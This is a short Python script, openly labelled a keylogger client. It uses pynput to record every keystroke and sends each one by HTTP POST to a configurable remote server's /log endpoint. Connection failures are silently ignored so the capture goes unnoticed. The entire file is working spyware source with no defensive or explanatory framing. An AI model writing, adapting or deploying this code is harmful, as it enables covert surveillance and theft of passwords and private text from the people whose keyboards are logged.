import requests
from pynput import keyboard
import argparse
import threading

# Parse CLI arguments
parser = argparse.ArgumentParser(description="Keylogger client")
parser.add_argument(
    "-s",
    "--server",
    type=str,
    default="127.0.0.1",
    help="Destination of the server (default: http://127.0.0.1)",
)
parser.add_argument(
    "-p",
    "--port",
    type=int,
    default=5000,
    help="Port of the server (default: 5000)",
)
args = parser.parse_args()


# Keylogger functionality
def on_press(key):
    try:
        k = key.char if key.char else str(key)
    except AttributeError:
        k = str(key)

    # Clean up the key representation
    readable_key = k.replace("'", "")
    if readable_key == "Key.space":
        readable_key = "[SPACE]"
    elif readable_key.startswith("Key."):
        readable_key = f"[{readable_key.split('.')[-1].upper()}]"

    # Create a new thread to send the keystroke to the server
    threading.Thread(target=send_keystroke, args=(readable_key,)).start()


def send_keystroke(key):
    try:
        # Send keystroke to the server
        requests.post(f"http://{args.server}:{args.port}/log", json={"keystroke": key})
    except requests.exceptions.ConnectionError:
        # If server is not available, skip the keystroke (no lag)
        pass


# Start the keylogger listener
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    # Start keylogger
    start_keylogger()
